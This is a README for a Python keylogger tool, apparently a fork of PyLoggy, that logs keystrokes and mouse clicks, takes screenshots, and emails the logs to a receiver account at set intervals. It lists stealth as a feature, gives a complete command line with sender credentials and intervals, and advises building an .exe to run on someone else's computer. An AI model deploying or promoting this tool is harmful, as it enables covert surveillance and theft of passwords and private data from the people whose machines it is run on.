# PieLoggy
PieLoggy is a modified version from [D4Vinci/PyLoggy](https://github.com/D4Vinci/PyLoggy) as a CLI version and work in python 3. Able to log keystrokes, log mouse clicks, take screenshots and more! The tool will send the logs to your email every x minutes.

## Features
- Fast
- Lightweight
- Screenshot
- Email
- Stealth
- Ease of use

## Example Usage
```ps1
> python ./src/PieLoggy.py -g example@gmail.com -p examplePassword -r examplereceiver@gmail.com --ss-interval=30 --mail-interval=300 -f 'D:/test/'
```
It'll run the program and screenshot every 30 seconds, mail it every 5 minutes, example as a sender account, examplePassword as an example account password, examplereceiver as a receiver account and `D:/test/` as a location where the logs and screenshot stored locally.

## Using gmail
To use gmail function you need to enable [allow less secure apps](https://myaccount.google.com/lesssecureapps) (only for sender gmail)

### Note
- To generate .exe file you can execute `build.ps1`, make sure you install the dependencies first with `> pipenv install`  
- Tested in python 3.8 not sure if other version is working.
- Consider using .exe because perhaps someone's computer doesn't have python installed.
